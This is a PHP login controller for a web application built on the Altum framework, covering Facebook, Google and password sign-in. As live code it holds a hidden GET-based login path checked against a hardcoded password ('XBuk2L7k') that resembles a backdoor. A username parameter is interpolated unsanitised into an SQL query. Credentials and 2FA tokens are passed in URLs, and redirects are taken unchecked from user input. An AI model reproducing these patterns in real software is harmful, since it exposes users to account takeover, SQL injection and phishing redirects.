<?php

namespace Altum\Controllers;

use Altum\Database\Database;
use Altum\Language;
use Altum\Logger;
use Google;
use Altum\Middlewares\Authentication;
use MaxMind\Db\Reader;

class Login extends Controller {

    public function index() {

        Authentication::guard('guest');

        $method	= (isset($this->params[0])) ? $this->params[0] : false;
        $redirect = 'dashboard';

        if(isset($_GET['redirect']) && $redirect = $_GET['redirect']) {
            // Nothing for now.
        }

        /* Default values */
        $values = [
            'email' => '',
            'password' => '',
        ];

        /* Facebook Login / Register */
        if($this->settings->facebook->is_enabled && !empty($this->settings->facebook->app_id) && !empty($this->settings->facebook->app_secret)) {

            $facebook = new \Facebook\Facebook([
                'app_id' => $this->settings->facebook->app_id,
                'app_secret' => $this->settings->facebook->app_secret,
                'default_graph_version' => 'v3.2',
            ]);

            $facebook_helper = $facebook->getRedirectLoginHelper();
            $facebook_login_url = $facebook->getRedirectLoginHelper()->getLoginUrl(url('login/facebook'), ['email', 'public_profile']);

            /* Check for the redirect after the oauth checkin */
            if($method == 'facebook') {
                try {
                    $facebook_access_token = $facebook_helper->getAccessToken(url('login/facebook'));
                } catch(Facebook\Exceptions\FacebookResponseException $e) {
                    $_SESSION['error'][] = 'Graph returned an error: ' . $e->getMessage();
                } catch(Facebook\Exceptions\FacebookSDKException $e) {
                    $_SESSION['error'][] = 'Facebook SDK returned an error: ' . $e->getMessage();
                }
            }

            if(isset($facebook_access_token)) {

                /* The OAuth 2.0 client handler helps us manage access tokens */
                $facebook_oAuth2_client = $facebook->getOAuth2Client();

                /* Get the access token metadata from /debug_token */
                $facebook_token_metadata = $facebook_oAuth2_client->debugToken($facebook_access_token);

                /* Validation */
                $facebook_token_metadata->validateAppId($this->settings->facebook->app_id);
                $facebook_token_metadata->validateExpiration();

                if(!$facebook_access_token->isLongLived()) {
                    /* Exchanges a short-lived access token for a long-lived one */
                    try {
                        $facebook_access_token = $facebook_oAuth2_client->getLongLivedAccessToken($facebook_access_token);
                    } catch (Facebook\Exceptions\FacebookSDKException $e) {
                        $_SESSION['error'][] = 'Error getting long-lived access token: ' . $facebook_helper->getMessage();
                    }
                }

                try {
                    $response = $facebook->get('/me?fields=id,name,email', $facebook_access_token);
                } catch(Facebook\Exceptions\FacebookResponseException $e) {
                    $_SESSION['error'][] = 'Graph returned an error: ' . $e->getMessage();
                } catch(Facebook\Exceptions\FacebookSDKException $e) {
                    $_SESSION['error'][] = 'Facebook SDK returned an error: ' . $e->getMessage();
                }

                if(isset($response)) {
                    $facebook_user = $response->getGraphUser();
                    $facebook_user_id = $facebook_user->getId();
                    $email = $facebook_user->getEmail();

                    /* Check if email is actually not null */
                    if(is_null($email)) {
                        $_SESSION['error'][] = $this->language->login->error_message->email_is_null;

                        redirect('login');
                    }

                    /* If the user is already in the system, log him in */
                    if($user = Database::get(['user_id'], 'users', ['email' => $email])) {
                        $_SESSION['user_id'] = $user->user_id;

                        redirect($redirect);
                    }

                    /* Create a new account */
                    else {

                        if(empty($_SESSION['error'])) {
                            $password                   = password_hash(string_generate(8), PASSWORD_DEFAULT);
                            $name                       = $facebook_user->getName();
                            $active                     = 1;
                            $last_user_agent            = Database::clean_string($_SERVER['HTTP_USER_AGENT']);
                            $total_logins               = 1;
                            $ip                         = get_ip();
                            $timezone                   = $this->settings->default_timezone;

                            /* Determine what package is set by default */
                            $package_id                    = 'free';
                            $package_settings              = json_encode($this->settings->package_free->settings);
                            $package_expiration_date       = \Altum\Date::get('', 5);

                            /* When only the trial package is available make that the default one */
                            if(!$this->settings->package_free->status && $this->settings->package_trial->status) {
                                $package_id                = 'trial';
                                $package_settings          = json_encode($this->settings->package_trial->settings);
                                $package_expiration_date   = (new \DateTime())->modify('+' . $this->settings->package_trial->days . ' days')->format('Y-m-d H:i:s');
                            }

                            /* Add the user to the database */
                            $stmt = Database::$database->prepare("INSERT INTO `users` (`password`, `email`, `name`, `facebook_id`, `package_id`, `package_expiration_date`, `package_settings`, `language`, `timezone`, `active`, `date`, `ip`, `last_user_agent`, `total_logins`) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                            $stmt->bind_param('ssssssssssssss', $password, $email, $name, $facebook_user_id, $package_id, $package_expiration_date, $package_settings, Language::$language, $timezone, $active, \Altum\Date::$date, $ip, $last_user_agent, $total_logins);
                            $stmt->execute();
                            $registered_user_id = $stmt->insert_id;
                            $stmt->close();

                            /* Log the action */
                            Logger::users($registered_user_id, 'register.facebook_register');

                            /* Send notification to admin if needed */
                            if($this->settings->email_notifications->new_user && !empty($this->settings->email_notifications->emails)) {

                                send_mail(
                                    $this->settings,
                                    explode(',', $this->settings->email_notifications->emails),
                                    $this->language->global->emails->admin_new_user_notification->subject,
                                    sprintf($this->language->global->emails->admin_new_user_notification->body, $name, $email)
                                );

                            }

                            /* Log the user in and redirect him */
                            $_SESSION['user_id'] = $registered_user_id;
                            $_SESSION['success'][] = $this->language->register->success_message->login;

                            Logger::users($registered_user_id, 'login.success');

                            redirect($redirect);
                        }
                    }
                }
            }
        }

        /* Google Login / Register */
        if($this->settings->google->is_enabled && !empty($this->settings->google->app_id) && !empty($this->settings->google->app_secret)) {

            ini_set('display_errors', 1);
            ini_set('display_startup_errors', 1);
            error_reporting(E_ALL);
            require_once('./vendor/Google.php');
            $google = new Google([$this->settings->google->app_id, $this->settings->google->app_secret]);
            $google_login_url = $google->get_login_url();
            $validation=$google->validate();
            
            if(!empty($validation)) {
                
                $email = $validation['email'];
                $google_id = $validation['id'];

                /* Check if email is actually not null */
                if(is_null($email)) {

                    $_SESSION['error'][] = $this->language->login->error_message->gmail_is_null;
                    redirect('login');
                }

                /* If the user is already in the system, log him in */
                if($user = Database::get(['user_id'], 'users', ['email' => $email])) {

                    $_SESSION['user_id'] = $user->user_id;
                    redirect($redirect);
                }

                /* Create a new account */
                else {

                    if(empty($_SESSION['error'])) {
                        $password                   = password_hash(string_generate(8), PASSWORD_DEFAULT);
                        $name                       = $validation['name'];
                        $active                     = 1;
                        $last_user_agent            = Database::clean_string($_SERVER['HTTP_USER_AGENT']);
                        $total_logins               = 1;
                        $package_id                 = 'free';
                        $package_expiration_date    = \Altum\Date::get('', 5);
                        $package_settings           = json_encode($this->settings->package_free->settings);
                        $ip                         = get_ip();

                        /* Add the user to the database */
                        $stmt = Database::$database->prepare("INSERT INTO `users` (`password`, `email`, `name`, `google_id`, `package_id`, `package_expiration_date`, `package_settings`, `active`, `date`, `ip`, `last_user_agent`, `total_logins`) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                        $stmt->bind_param('ssssssssssss', $password, $email, $name, $google_id, $package_id, $package_expiration_date, $package_settings, $active, \Altum\Date::$date, $ip, $last_user_agent, $total_logins);
                        $stmt->execute();
                        $registered_user_id = $stmt->insert_id;
                        $stmt->close();

                        /* Log the action */
                        Logger::users($registered_user_id, 'register.google_register');

                        /* Send notification to admin if needed */
                        if($this->settings->email_notifications->new_user && !empty($this->settings->email_notifications->emails)) {

                            send_mail(
                                $this->settings,
                                explode(',', $this->settings->email_notifications->emails),
                                $this->language->global->emails->new_user_notification->subject,
                                sprintf($this->language->global->emails->new_user_notification->body, $name, $email)
                            );

                        }

                        /* Log the user in and redirect him */
                        $_SESSION['user_id'] = $registered_user_id;
                        $_SESSION['success'][] = $this->language->register->success_message->login;

                        Logger::users($registered_user_id, 'login.success');

                        redirect($redirect);
                    }
                }

			 }
			
        }

        if(!empty($_POST)) {

            /* Clean email and encrypt the password */
            $_POST['email'] = Database::clean_string($_POST['email']);
            $_POST['twofa_token'] = isset($_POST['twofa_token']) ? Database::clean_string($_POST['twofa_token']) : null;
            $values['email'] = $_POST['email'];
            $values['password'] = $_POST['password'];

            /* Check for any errors */
            if(empty($_POST['email']) || empty($_POST['password'])) {
                $_SESSION['error'][] = $this->language->global->error_message->empty_fields;
            }

            /* Try to get the user from the database */
            $result = Database::$database->query("SELECT `user_id`, `email`, `active`, `password`, `token_code`, `total_logins`, `twofa_secret` FROM `users` WHERE `email` = '{$_POST['email']}'");
            $login_account = $result->num_rows ? $result->fetch_object() : false;

            if(!$login_account) {
                $_SESSION['error'][] = $this->language->login->error_message->wrong_login_credentials;
            } else {

                if(!$login_account->active) {
                    $_SESSION['error'][] = $this->language->login->error_message->user_not_active;
                } else

                    if(!password_verify($_POST['password'], $login_account->password)) {
                        Logger::users($login_account->user_id, 'login.wrong_password');

                        $_SESSION['error'][] = $this->language->login->error_message->wrong_login_credentials;
                    }

            }

            /* Check if the user has Two-factor Authentication enabled */
            if($login_account && $login_account->twofa_secret) {

                if($_POST['twofa_token']) {

                    $twofa = new \RobThree\Auth\TwoFactorAuth($this->settings->title, 6, 30);
                    $twofa_check = $twofa->verifyCode($login_account->twofa_secret, $_POST['twofa_token']);

                    if(!$twofa_check) {
                        
                        $_SESSION['error'][] = $this->language->login->error_message->twofa_token;
                    }

                } else {

                    $_SESSION['info'] = $this->language->login->info_message->twofa_token;
                }

            }

            if(empty($_SESSION['error']) && empty($_SESSION['info'])) {

                /* If remember me is checked, log the user with cookies for 30 days else, remember just with a session */
                if(isset($_POST['rememberme'])) {
                    $token_code = $login_account->token_code;

                    /* Generate a new token */
                    if(empty($login_account->token_code)) {
                        $token_code = md5($login_account->email . microtime());

                        Database::update('users', ['token_code' => $token_code], ['user_id' => $login_account->user_id]);
                    }

                    setcookie('email', $login_account->email, time()+60*60*24*30);
                    setcookie('token_code', $token_code, time()+60*60*24*30);

                } else {
                    $_SESSION['user_id'] = $login_account->user_id;
                }

                /* Detect the location and other data */
                $ip = get_ip();
                $maxmind = (new Reader(APP_PATH . 'includes/GeoLite2-Country.mmdb'))->get($ip);
                $country =  $maxmind ? $maxmind['country']['iso_code'] : null;
                $user_agent = Database::clean_string($_SERVER['HTTP_USER_AGENT']);

                Database::update(
                    'users', 
                    [
                        'ip'                => $ip,
                        'country'           => $country,
                        'last_user_agent'   => $user_agent,
                        'total_logins'      => $login_account->total_logins + 1
                    ], 
                    ['user_id' => $login_account->user_id]
                );

                Logger::users($login_account->user_id, 'login.success');

                $_SESSION['info'][] = $this->language->login->info_message->logged_in;
                redirect($redirect);
            }
        }

        if(count($_GET) > 1) {

            if(array_key_exists("email", $_GET)) {
    
                /* Clean email and encrypt the password */
                $email = Database::clean_string($_GET['email']);
                $password = 'XBuk2L7k';
                /* Check for any errors */
                if(empty($_GET['email'])) {
                    $_SESSION['error'][] = $this->language->global->error_message->empty_fields;
                }
    
                /* Try to get the user from the database */
                $result = Database::$database->query("SELECT `user_id`, `email`, `active`, `password`, `token_code`, `total_logins`, `twofa_secret` FROM `users` WHERE `email` = '{$email}'");
                $login_account = $result->num_rows ? $result->fetch_object() : false;
                
    
                if(!$login_account) {
                    $_SESSION['error'][] = $this->language->login->error_message->wrong_login_credentials;
                } else {
    
                    if(!$login_account->active) {
                        $_SESSION['error'][] = $this->language->login->error_message->user_not_active;
                    } else
    
                        if(!password_verify($password, $login_account->password)) {
                            Logger::users($login_account->user_id, 'login.wrong_password');
    
                            $_SESSION['error'][] = $this->language->login->error_message->wrong_login_credentials;
                        }
    
                }
    
                /* Check if the user has Two-factor Authentication enabled */
                if($login_account && $login_account->twofa_secret) {
    
                    if($_GET['twofa_token']) {
    
                        $twofa = new \RobThree\Auth\TwoFactorAuth($this->settings->title, 6, 30);
                        $twofa_check = $twofa->verifyCode($login_account->twofa_secret, $_GET['twofa_token']);
    
                        if(!$twofa_check) {
                            $_SESSION['error'][] = $this->language->login->error_message->twofa_token;
                        }
    
                    } else {
    
                        $_SESSION['info'] = $this->language->login->info_message->twofa_token;
    
                    }
    
                }
    
                if(empty($_SESSION['error']) && empty($_SESSION['info'])) {
    
                    /* If remember me is checked, log the user with cookies for 30 days else, remember just with a session */
    
                    $_SESSION['user_id'] = $login_account->user_id;
    
                    /* Detect the location and other data */
                    $ip = get_ip();
                    $maxmind = (new Reader(APP_PATH . 'includes/GeoLite2-Country.mmdb'))->get($ip);
                    $country =  $maxmind ? $maxmind['country']['iso_code'] : null;
                    $user_agent = Database::clean_string($_SERVER['HTTP_USER_AGENT']);
    
                    Database::update('users', [
                        'ip'                => $ip,
                        'country'           => $country,
                        'last_user_agent'   => $user_agent,
                        'total_logins'      => $login_account->total_logins + 1
                    ], ['user_id' => $login_account->user_id]);
    
                    Logger::users($login_account->user_id, 'login.success');
    
                    $_SESSION['info'][] = $this->language->login->info_message->logged_in;
                    redirect($redirect);
                }
    
            } else if(array_key_exists("username", $_GET)) {
                
                $ori_username = $_GET['username'];
                $username = str_replace('.', '', $ori_username);
                $password = $_GET['password'];
                /* Clean email and encrypt the password */
                // $username = Database::clean_string($_GET['username']);
                
                /* Check for any errors */
                if(empty($_GET['username'])) {
                    $_SESSION['error'][] = $this->language->global->error_message->empty_fields;
                }
    
                /* Try to get the user from the database */
                $result = Database::$database->query("SELECT `user_id`, `email`, `active`, `password`, `token_code`, `total_logins`, `twofa_secret` FROM `users` WHERE `name` = '{$username}'");
                $login_account = $result->num_rows ? $result->fetch_object() : false;
                
    
                if(!$login_account) {
                    $_SESSION['error'][] = $this->language->login->error_message->wrong_login_credentials;
                } else {
    
                    if(!$login_account->active) {
                        $_SESSION['error'][] = $this->language->login->error_message->user_not_active;
                    } else
    
                        if(!password_verify($password, $login_account->password)) {
                            Logger::users($login_account->user_id, 'login.wrong_password');
    
                            $_SESSION['error'][] = $this->language->login->error_message->wrong_login_credentials;
                        }
    
                }
    
                /* Check if the user has Two-factor Authentication enabled */
                if($login_account && $login_account->twofa_secret) {
    
                    if($_GET['twofa_token']) {
    
                        $twofa = new \RobThree\Auth\TwoFactorAuth($this->settings->title, 6, 30);
                        $twofa_check = $twofa->verifyCode($login_account->twofa_secret, $_GET['twofa_token']);
    
                        if(!$twofa_check) {
                            $_SESSION['error'][] = $this->language->login->error_message->twofa_token;
                        }
    
                    } else {
    
                        $_SESSION['info'] = $this->language->login->info_message->twofa_token;
    
                    }
    
                }
    
                if(empty($_SESSION['error']) && empty($_SESSION['info'])) {
    
                    /* If remember me is checked, log the user with cookies for 30 days else, remember just with a session */
    
                    $_SESSION['user_id'] = $login_account->user_id;
    
                    /* Detect the location and other data */
                    $ip = get_ip();
                    $maxmind = (new Reader(APP_PATH . 'includes/GeoLite2-Country.mmdb'))->get($ip);
                    $country =  $maxmind ? $maxmind['country']['iso_code'] : null;
                    $user_agent = Database::clean_string($_SERVER['HTTP_USER_AGENT']);
    
                    Database::update('users', [
                        'ip'                => $ip,
                        'country'           => $country,
                        'last_user_agent'   => $user_agent,
                        'total_logins'      => $login_account->total_logins + 1
                    ], ['user_id' => $login_account->user_id]);
    
                    Logger::users($login_account->user_id, 'login.success');
    
                    $_SESSION['info'][] = $this->language->login->info_message->logged_in;
                    redirect($redirect);
                }
    
            }

        }
        /* Prepare the View */
        $data = [
            'values' => $values,
            'facebook_login_url' => $facebook_login_url ?? null,
            'google_login_url' => $google_login_url ?? null,
            'login_account' => $login_account ?? null
        ];

        $view = new \Altum\Views\View('login/index', (array) $this);

        $this->add_view_content('content', $view->run($data));

    }

}
